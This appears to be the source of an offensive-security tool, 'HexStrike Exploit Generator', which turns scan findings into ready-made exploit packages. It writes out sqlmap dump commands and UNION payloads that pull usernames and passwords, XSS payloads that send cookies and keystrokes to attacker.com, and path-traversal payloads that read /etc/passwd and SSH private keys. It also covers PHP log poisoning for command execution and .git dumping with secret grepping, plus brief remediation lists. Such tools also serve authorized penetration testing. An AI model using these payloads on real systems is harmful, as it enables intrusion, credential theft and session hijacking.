"""
HexStrike Free Edition - Exploit Generator
Generates real working exploits from vulnerability findings
"""

import json
from datetime import datetime
from typing import Dict, List, Optional
import urllib.parse


class ExploitGenerator:
    """Generates actionable exploits from vulnerability findings"""
    
    def __init__(self):
        self.exploits = []
    
    def generate_sql_injection_exploit(self, vuln: Dict) -> Dict:
        """Generate SQL injection exploit with real commands"""
        target = vuln.get('target', '')
        param = vuln.get('parameter', '')
        method = vuln.get('method', 'GET')
        
        # Parse URL to extract base and parameter
        parsed = urllib.parse.urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        exploit = {
            'type': 'SQL Injection',
            'severity': 'CRITICAL',
            'target': target,
            'parameter': param,
            'method': method,
            'automated_commands': [],
            'manual_steps': [],
            'curl_examples': [],
            'expected_output': '',
            'remediation': []
        }
        
        # SQLMap automated command
        if method == 'GET':
            sqlmap_cmd = f'sqlmap -u "{target}" --batch --level=5 --risk=3'
            sqlmap_cmd += f' -p {param} --dbs --dump --threads=5'
            exploit['automated_commands'].append({
                'tool': 'SQLMap',
                'command': sqlmap_cmd,
                'description': 'Automated SQL injection exploitation'
            })
        else:  # POST
            sqlmap_cmd = f'sqlmap -u "{base_url}" --data="{param}=1" --batch --level=5 --risk=3'
            sqlmap_cmd += f' -p {param} --dbs --dump --threads=5'
            exploit['automated_commands'].append({
                'tool': 'SQLMap',
                'command': sqlmap_cmd,
                'description': 'Automated SQL injection exploitation (POST)'
            })
        
        # Manual exploitation steps
        exploit['manual_steps'] = [
            {
                'step': 1,
                'description': 'Test for SQL injection vulnerability',
                'payload': f"{target.replace(f'{param}=', f'{param}=')}' OR '1'='1",
                'expected': 'Application returns different response or errors'
            },
            {
                'step': 2,
                'description': 'Determine number of columns',
                'payload': f"{target.replace(f'{param}=', f'{param}=')}' ORDER BY 1--",
                'expected': 'Increment until error occurs to find column count'
            },
            {
                'step': 3,
                'description': 'Find injectable columns with UNION',
                'payload': f"{target.replace(f'{param}=', f'{param}=')}' UNION SELECT NULL,NULL,NULL--",
                'expected': 'Adjust NULL count based on column count from step 2'
            },
            {
                'step': 4,
                'description': 'Extract database names',
                'payload': f"{target.replace(f'{param}=', f'{param}=')}' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--",
                'expected': 'List of database names'
            },
            {
                'step': 5,
                'description': 'Extract table names',
                'payload': f"{target.replace(f'{param}=', f'{param}=')}' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='DATABASE_NAME'--",
                'expected': 'List of table names from target database'
            },
            {
                'step': 6,
                'description': 'Extract data from tables',
                'payload': f"{target.replace(f'{param}=', f'{param}=')}' UNION SELECT username,password,NULL FROM users--",
                'expected': 'Username and password data from users table'
            }
        ]
        
        # cURL examples
        exploit['curl_examples'] = [
            {
                'description': 'Basic SQL injection test',
                'command': f"curl -X {method} \"{target.replace(f'{param}=', f'{param}=')}' OR '1'='1\" -H \"User-Agent: Mozilla/5.0\""
            },
            {
                'description': 'UNION SELECT attack',
                'command': f"curl -X {method} \"{target.replace(f'{param}=', f'{param}=')}' UNION SELECT username,password,NULL FROM users--\" -H \"User-Agent: Mozilla/5.0\""
            },
            {
                'description': 'Database enumeration',
                'command': f"curl -X {method} \"{target.replace(f'{param}=', f'{param}=')}' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--\" -H \"User-Agent: Mozilla/5.0\""
            }
        ]
        
        exploit['expected_output'] = """
Database names, table structures, extracted credentials:
- Database: webapp_db
- Tables: users, products, orders
- Users table: id, username, password, email
- Sample data: admin:5f4dcc3b5aa765d61d8327deb882cf99 (hash)
"""
        
        exploit['remediation'] = [
            'Use parameterized queries (prepared statements)',
            'Implement input validation and sanitization',
            'Apply principle of least privilege to database accounts',
            'Use Web Application Firewall (WAF)',
            'Regularly update and patch database software'
        ]
        
        return exploit
    
    def generate_xss_exploit(self, vuln: Dict) -> Dict:
        """Generate XSS exploit with real payloads"""
        target = vuln.get('target', '')
        param = vuln.get('parameter', '')
        xss_type = vuln.get('xss_type', 'reflected')
        
        exploit = {
            'type': f'Cross-Site Scripting ({xss_type.upper()})',
            'severity': 'HIGH',
            'target': target,
            'parameter': param,
            'automated_commands': [],
            'manual_steps': [],
            'curl_examples': [],
            'expected_output': '',
            'remediation': []
        }
        
        # XSStrike automated command
        exploit['automated_commands'].append({
            'tool': 'XSStrike',
            'command': f'python xsstrike.py -u "{target}" --crawl --skip',
            'description': 'Automated XSS detection and exploitation'
        })
        
        # Manual exploitation steps
        exploit['manual_steps'] = [
            {
                'step': 1,
                'description': 'Test basic XSS with alert',
                'payload': '<script>alert("XSS")</script>',
                'expected': 'Alert popup appears in browser'
            },
            {
                'step': 2,
                'description': 'Cookie stealing payload',
                'payload': '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>',
                'expected': 'Cookies sent to attacker server'
            },
            {
                'step': 3,
                'description': 'BeEF hook injection',
                'payload': '<script src="http://attacker.com:3000/hook.js"></script>',
                'expected': 'Browser hooked to BeEF framework'
            },
            {
                'step': 4,
                'description': 'Keylogger injection',
                'payload': '<script>document.onkeypress=function(e){fetch("http://attacker.com/log?k="+e.key)}</script>',
                'expected': 'Keystrokes logged to attacker server'
            },
            {
                'step': 5,
                'description': 'Session hijacking',
                'payload': '<script>new Image().src="http://attacker.com/steal?session="+document.cookie</script>',
                'expected': 'Session tokens extracted'
            }
        ]
        
        # cURL examples
        exploit['curl_examples'] = [
            {
                'description': 'Test XSS reflection',
                'command': f'curl -X GET "{target.replace(f"{param}=", f"{param}=")}<script>alert(1)</script>" -H "User-Agent: Mozilla/5.0"'
            },
            {
                'description': 'Cookie stealing attack',
                'command': f'curl -X GET "{target.replace(f"{param}=", f"{param}=")}<script>fetch(\\"http://attacker.com/steal?c=\\"+document.cookie)</script>" -H "User-Agent: Mozilla/5.0"'
            }
        ]
        
        exploit['expected_output'] = """
XSS payload executes in victim browser:
- Alert boxes displayed
- Cookies/sessions stolen
- Keystrokes logged
- BeEF framework hook established
- Full control over victim browser
"""
        
        exploit['remediation'] = [
            'Implement proper output encoding (HTML, JavaScript, URL)',
            'Use Content Security Policy (CSP) headers',
            'Sanitize user input on both client and server side',
            'Use HTTPOnly and Secure flags on cookies',
            'Implement X-XSS-Protection header'
        ]
        
        return exploit
    
    def generate_lfi_exploit(self, vuln: Dict) -> Dict:
        """Generate LFI/Path Traversal exploit"""
        target = vuln.get('target', '')
        param = vuln.get('parameter', '')
        
        exploit = {
            'type': 'Local File Inclusion (LFI)',
            'severity': 'HIGH',
            'target': target,
            'parameter': param,
            'automated_commands': [],
            'manual_steps': [],
            'curl_examples': [],
            'expected_output': '',
            'remediation': []
        }
        
        # Automated commands
        exploit['automated_commands'].append({
            'tool': 'Wfuzz',
            'command': f'wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt "{target.replace(f"{param}=", f"{param}=FUZZ")}"',
            'description': 'Automated LFI fuzzing with SecLists'
        })
        
        # Manual exploitation steps
        exploit['manual_steps'] = [
            {
                'step': 1,
                'description': 'Basic path traversal test',
                'payload': '../../../etc/passwd',
                'expected': 'Contents of /etc/passwd file'
            },
            {
                'step': 2,
                'description': 'Windows file access',
                'payload': '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                'expected': 'Contents of Windows hosts file'
            },
            {
                'step': 3,
                'description': 'PHP wrapper - Log poisoning',
                'payload': 'php://filter/convert.base64-encode/resource=/var/log/apache2/access.log',
                'expected': 'Base64 encoded Apache logs'
            },
            {
                'step': 4,
                'description': 'Inject PHP code via log poisoning',
                'payload': '<?php system($_GET["cmd"]); ?> in User-Agent',
                'expected': 'PHP code execution via logs'
            },
            {
                'step': 5,
                'description': 'Read configuration files',
                'payload': '../../../etc/nginx/nginx.conf',
                'expected': 'Web server configuration'
            },
            {
                'step': 6,
                'description': 'Access SSH keys',
                'payload': '../../../home/user/.ssh/id_rsa',
                'expected': 'Private SSH keys'
            }
        ]
        
        # cURL examples
        exploit['curl_examples'] = [
            {
                'description': 'Read /etc/passwd',
                'command': f'curl -X GET "{target.replace(f"{param}=", f"{param}=")}../../../etc/passwd" -H "User-Agent: Mozilla/5.0"'
            },
            {
                'description': 'PHP wrapper attack',
                'command': f'curl -X GET "{target.replace(f"{param}=", f"{param}=")}php://filter/convert.base64-encode/resource=/etc/passwd" -H "User-Agent: Mozilla/5.0"'
            },
            {
                'description': 'Log poisoning - Inject payload',
                'command': f'curl -X GET "{target}" -H "User-Agent: <?php system($_GET[\'cmd\']); ?>"'
            },
            {
                'description': 'Execute command via poisoned log',
                'command': f'curl -X GET "{target.replace(f"{param}=", f"{param}=")}../../../var/log/apache2/access.log&cmd=whoami" -H "User-Agent: Mozilla/5.0"'
            }
        ]
        
        exploit['expected_output'] = """
Sensitive file contents revealed:
- /etc/passwd: User accounts and home directories
- Configuration files: Database credentials, API keys
- Log files: Session tokens, injection points
- SSH keys: Access to other systems
- PHP code execution: Full system compromise
"""
        
        exploit['remediation'] = [
            'Validate and sanitize file paths',
            'Use whitelist of allowed files',
            'Implement proper access controls',
            'Disable PHP dangerous functions (system, exec, etc.)',
            'Run web server with minimal privileges'
        ]
        
        return exploit
    
    def generate_info_disclosure_exploit(self, vuln: Dict) -> Dict:
        """Generate information disclosure exploit"""
        target = vuln.get('target', '')
        path = vuln.get('path', '')
        
        exploit = {
            'type': 'Information Disclosure',
            'severity': 'MEDIUM',
            'target': target,
            'path': path,
            'automated_commands': [],
            'manual_steps': [],
            'curl_examples': [],
            'expected_output': '',
            'remediation': []
        }
        
        # Automated commands
        exploit['automated_commands'].append({
            'tool': 'GitTools',
            'command': f'./gitdumper.sh {target}/.git/ ./output',
            'description': 'Extract exposed Git repository'
        })
        
        exploit['automated_commands'].append({
            'tool': 'wget',
            'command': f'wget -r -np -nH --cut-dirs=1 {target}/.git/',
            'description': 'Download entire .git directory'
        })
        
        # Manual exploitation steps
        if '.git' in path:
            exploit['manual_steps'] = [
                {
                    'step': 1,
                    'description': 'Download Git HEAD file',
                    'payload': f'{target}/.git/HEAD',
                    'expected': 'ref: refs/heads/main'
                },
                {
                    'step': 2,
                    'description': 'Download Git config',
                    'payload': f'{target}/.git/config',
                    'expected': 'Repository configuration including remotes'
                },
                {
                    'step': 3,
                    'description': 'Download commit logs',
                    'payload': f'{target}/.git/logs/HEAD',
                    'expected': 'Commit history with timestamps'
                },
                {
                    'step': 4,
                    'description': 'Extract source code',
                    'payload': 'git checkout .',
                    'expected': 'Full application source code recovered'
                },
                {
                    'step': 5,
                    'description': 'Search for secrets in commits',
                    'payload': 'git log -p | grep -i "password\\|secret\\|key"',
                    'expected': 'Exposed credentials and API keys'
                }
            ]
        else:
            exploit['manual_steps'] = [
                {
                    'step': 1,
                    'description': 'Download exposed file',
                    'payload': f'{target}{path}',
                    'expected': 'Sensitive configuration data'
                },
                {
                    'step': 2,
                    'description': 'Extract credentials',
                    'payload': 'grep -i "password\\|user\\|key\\|token" file',
                    'expected': 'Database credentials, API keys'
                },
                {
                    'step': 3,
                    'description': 'Analyze configuration',
                    'payload': 'Review database connections and services',
                    'expected': 'Infrastructure details'
                }
            ]
        
        # cURL examples
        exploit['curl_examples'] = [
            {
                'description': 'Download exposed file',
                'command': f'curl -X GET "{target}{path}" -H "User-Agent: Mozilla/5.0" -o output.txt'
            },
            {
                'description': 'Check for Git repository',
                'command': f'curl -X GET "{target}/.git/HEAD" -H "User-Agent: Mozilla/5.0"'
            },
            {
                'description': 'Download Git config',
                'command': f'curl -X GET "{target}/.git/config" -H "User-Agent: Mozilla/5.0"'
            }
        ]
        
        exploit['expected_output'] = """
Sensitive information extracted:
- Database credentials (username/password)
- API keys and tokens
- Full source code (if .git exposed)
- Configuration files revealing infrastructure
- Internal paths and service details
- Commit history with potential secrets
"""
        
        exploit['remediation'] = [
            'Remove .git directories from production servers',
            'Restrict access to configuration files',
            'Use environment variables for sensitive data',
            'Implement proper .gitignore rules',
            'Regular security audits of exposed files'
        ]
        
        return exploit
    
    def generate_exploit(self, vulnerability: Dict) -> Dict:
        """Generate exploit based on vulnerability type"""
        vuln_type = vulnerability.get('type', '').lower()
        
        if 'sql' in vuln_type or 'injection' in vuln_type:
            return self.generate_sql_injection_exploit(vulnerability)
        elif 'xss' in vuln_type or 'cross-site' in vuln_type:
            return self.generate_xss_exploit(vulnerability)
        elif 'lfi' in vuln_type or 'traversal' in vuln_type or 'file inclusion' in vuln_type:
            return self.generate_lfi_exploit(vulnerability)
        elif 'disclosure' in vuln_type or 'exposure' in vuln_type:
            return self.generate_info_disclosure_exploit(vulnerability)
        else:
            return {
                'type': vulnerability.get('type', 'Unknown'),
                'severity': vulnerability.get('severity', 'UNKNOWN'),
                'target': vulnerability.get('target', ''),
                'message': 'Exploit generation not implemented for this vulnerability type',
                'remediation': ['Consult security documentation', 'Apply vendor patches']
            }
    
    def generate_all_exploits(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """Generate exploits for all vulnerabilities"""
        exploits = []
        for vuln in vulnerabilities:
            exploit = self.generate_exploit(vuln)
            exploit['timestamp'] = datetime.now().isoformat()
            exploits.append(exploit)
        return exploits
    
    def export_exploits_html(self, exploits: List[Dict]) -> str:
        """Export exploits as HTML report"""
        html = """
<!DOCTYPE html>
<html>
<head>
    <title>HexStrike Exploit Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .exploit { background: white; padding: 20px; margin: 20px 0; border-left: 4px solid #e74c3c; }
        .exploit h2 { color: #e74c3c; margin-top: 0; }
        .severity { padding: 5px 10px; color: white; border-radius: 3px; display: inline-block; }
        .critical { background: #c0392b; }
        .high { background: #e74c3c; }
        .medium { background: #f39c12; }
        .low { background: #3498db; }
        .command { background: #2c3e50; color: #ecf0f1; padding: 10px; margin: 10px 0; overflow-x: auto; }
        .step { margin: 10px 0; padding: 10px; background: #ecf0f1; }
        pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
    </style>
</head>
<body>
    <h1>üéØ HexStrike Exploit Report</h1>
    <p>Generated: """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """</p>
"""
        
        for exploit in exploits:
            severity_class = exploit.get('severity', 'UNKNOWN').lower()
            html += f"""
    <div class="exploit">
        <h2>{exploit.get('type', 'Unknown')}</h2>
        <p><span class="severity {severity_class}">{exploit.get('severity', 'UNKNOWN')}</span></p>
        <p><strong>Target:</strong> {exploit.get('target', 'N/A')}</p>
"""
            
            if exploit.get('automated_commands'):
                html += "<h3>ü§ñ Automated Commands</h3>"
                for cmd in exploit['automated_commands']:
                    html += f"""
        <div class="command">
            <strong>{cmd['tool']}:</strong> {cmd['description']}<br>
            <pre>{cmd['command']}</pre>
        </div>
"""
            
            if exploit.get('manual_steps'):
                html += "<h3>üìù Manual Exploitation Steps</h3>"
                for step in exploit['manual_steps']:
                    html += f"""
        <div class="step">
            <strong>Step {step['step']}:</strong> {step['description']}<br>
            <strong>Payload:</strong> <code>{step['payload']}</code><br>
            <strong>Expected:</strong> {step['expected']}
        </div>
"""
            
            if exploit.get('curl_examples'):
                html += "<h3>üîß cURL Examples</h3>"
                for example in exploit['curl_examples']:
                    html += f"""
        <div class="command">
            <strong>{example['description']}</strong><br>
            <pre>{example['command']}</pre>
        </div>
"""
            
            if exploit.get('expected_output'):
                html += f"""
        <h3>‚úÖ Expected Output</h3>
        <pre>{exploit['expected_output']}</pre>
"""
            
            if exploit.get('remediation'):
                html += "<h3>üõ°Ô∏è Remediation</h3><ul>"
                for rem in exploit['remediation']:
                    html += f"<li>{rem}</li>"
                html += "</ul>"
            
            html += "</div>"
        
        html += """
</body>
</html>
"""
        return html
    
    def export_exploits_text(self, exploits: List[Dict]) -> str:
        """Export exploits as plain text"""
        text = "=" * 80 + "\n"
        text += "HexStrike Exploit Report\n"
        text += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        text += "=" * 80 + "\n\n"
        
        for i, exploit in enumerate(exploits, 1):
            text += f"\n[{i}] {exploit.get('type', 'Unknown')} - {exploit.get('severity', 'UNKNOWN')}\n"
            text += "-" * 80 + "\n"
            text += f"Target: {exploit.get('target', 'N/A')}\n\n"
            
            if exploit.get('automated_commands'):
                text += "AUTOMATED COMMANDS:\n"
                for cmd in exploit['automated_commands']:
                    text += f"\n{cmd['tool']}: {cmd['description']}\n"
                    text += f"Command: {cmd['command']}\n"
            
            if exploit.get('manual_steps'):
                text += "\nMANUAL STEPS:\n"
                for step in exploit['manual_steps']:
                    text += f"\nStep {step['step']}: {step['description']}\n"
                    text += f"Payload: {step['payload']}\n"
                    text += f"Expected: {step['expected']}\n"
            
            if exploit.get('curl_examples'):
                text += "\nCURL EXAMPLES:\n"
                for example in exploit['curl_examples']:
                    text += f"\n{example['description']}:\n{example['command']}\n"
            
            if exploit.get('expected_output'):
                text += f"\nEXPECTED OUTPUT:{exploit['expected_output']}\n"
            
            if exploit.get('remediation'):
                text += "\nREMEDIATION:\n"
                for rem in exploit['remediation']:
                    text += f"- {rem}\n"
            
            text += "\n" + "=" * 80 + "\n"
        
        return text
    
    def export_exploits_json(self, exploits: List[Dict]) -> str:
        """Export exploits as JSON"""
        return json.dumps({
            'report_type': 'exploit_generation',
            'generated_at': datetime.now().isoformat(),
            'total_exploits': len(exploits),
            'exploits': exploits
        }, indent=2)
    
    def generate_exploits_from_scan(self, scan_results: Dict) -> List:
        """Generate exploits from active scanner results
        
        Args:
            scan_results: Dictionary with keys: sql_injection, xss, lfi, info_disclosure
                         Each containing list of vulnerability dicts
        
        Returns:
            List of Exploit objects (simplified dicts for now)
        """
        from dataclasses import dataclass
        
        @dataclass
        class Exploit:
            vulnerability_type: str
            target_url: str
            parameter: str
            payload: str
            command: str
            manual_steps: List[str]
            curl_example: str
            expected_output: str
            risk_level: str
            remediation: str
        
        exploits = []
        
        # SQL Injection exploits
        for sql_vuln in scan_results.get('sql_injection', []):
            exploit_dict = self.generate_sql_injection_exploit({
                'target': sql_vuln.get('url', ''),
                'parameter': sql_vuln.get('param', 'id'),
                'method': 'GET'
            })
            
            # Convert to Exploit object
            exploit = Exploit(
                vulnerability_type='SQL Injection',
                target_url=sql_vuln.get('url', ''),
                parameter=sql_vuln.get('param', 'unknown'),
                payload=sql_vuln.get('payload', ''),
                command=exploit_dict['automated_commands'][0]['command'] if exploit_dict['automated_commands'] else '',
                manual_steps=[f"{s['step']}. {s['description']}: {s['payload']}" for s in exploit_dict['manual_steps']],
                curl_example=exploit_dict['curl_examples'][0]['command'] if exploit_dict['curl_examples'] else '',
                expected_output='Database names, table structures, extracted credentials',
                risk_level='CRITICAL',
                remediation='Use parameterized queries (prepared statements)'
            )
            exploits.append(exploit)
        
        # XSS exploits
        for xss_vuln in scan_results.get('xss', []):
            exploit_dict = self.generate_xss_exploit({
                'target': xss_vuln.get('url', ''),
                'parameter': xss_vuln.get('param', 'q'),
                'method': 'GET'
            })
            
            exploit = Exploit(
                vulnerability_type='Cross-Site Scripting (XSS)',
                target_url=xss_vuln.get('url', ''),
                parameter=xss_vuln.get('param', 'unknown'),
                payload=xss_vuln.get('payload', ''),
                command=exploit_dict['automated_commands'][0]['command'] if exploit_dict['automated_commands'] else '',
                manual_steps=[f"{s['step']}. {s['description']}" for s in exploit_dict['manual_steps']],
                curl_example=exploit_dict['curl_examples'][0]['command'] if exploit_dict['curl_examples'] else '',
                expected_output='Cookie theft, session hijacking, or DOM manipulation',
                risk_level='HIGH',
                remediation='Sanitize all user input and use Content Security Policy'
            )
            exploits.append(exploit)
        
        # LFI exploits
        for lfi_vuln in scan_results.get('lfi', []):
            exploit_dict = self.generate_lfi_exploit({
                'target': lfi_vuln.get('url', ''),
                'parameter': lfi_vuln.get('param', 'file'),
                'method': 'GET'
            })
            
            exploit = Exploit(
                vulnerability_type='Local File Inclusion (LFI)',
                target_url=lfi_vuln.get('url', ''),
                parameter=lfi_vuln.get('param', 'unknown'),
                payload=lfi_vuln.get('payload', ''),
                command=exploit_dict['automated_commands'][0]['command'] if exploit_dict['automated_commands'] else '',
                manual_steps=[f"{s['step']}. {s['description']}" for s in exploit_dict['manual_steps']],
                curl_example=exploit_dict['curl_examples'][0]['command'] if exploit_dict['curl_examples'] else '',
                expected_output='/etc/passwd contents or arbitrary file disclosure',
                risk_level='CRITICAL',
                remediation='Use whitelist for file paths, avoid user input in file operations'
            )
            exploits.append(exploit)
        
        # Info Disclosure exploits
        for info_vuln in scan_results.get('info_disclosure', []):
            exploit_dict = self.generate_info_disclosure_exploit({
                'target': info_vuln.get('url', ''),
                'type': info_vuln.get('type', 'unknown')
            })
            
            exploit = Exploit(
                vulnerability_type='Information Disclosure',
                target_url=info_vuln.get('url', ''),
                parameter='N/A',
                payload='Direct access',
                command=exploit_dict['automated_commands'][0]['command'] if exploit_dict['automated_commands'] else '',
                manual_steps=[f"{s['step']}. {s['description']}" for s in exploit_dict['manual_steps']],
                curl_example=exploit_dict['curl_examples'][0]['command'] if exploit_dict['curl_examples'] else '',
                expected_output='Sensitive configuration, source code, or system information',
                risk_level='MEDIUM',
                remediation='Remove sensitive files or restrict access'
            )
            exploits.append(exploit)
        
        return exploits


if __name__ == "__main__":
    # Test exploit generation
    gen = ExploitGenerator()
    
    # Test SQL injection exploit
    test_vuln = {
        'type': 'SQL Injection',
        'target': 'http://testphp.vulnweb.com/listproducts.php?cat=1',
        'parameter': 'cat',
        'method': 'GET'
    }
    
    exploit = gen.generate_exploit(test_vuln)
    print("=" * 80)
    print("SQL INJECTION EXPLOIT GENERATED")
    print("=" * 80)
    print(f"\nType: {exploit['type']}")
    print(f"Severity: {exploit['severity']}")
    print(f"Target: {exploit['target']}")
    print(f"\nAutomated Command:")
    for cmd in exploit['automated_commands']:
        print(f"  {cmd['tool']}: {cmd['command']}")
    print(f"\nManual Steps: {len(exploit['manual_steps'])} steps")
    print(f"cURL Examples: {len(exploit['curl_examples'])} examples")
    print("\n‚úÖ Exploit generator is working!")
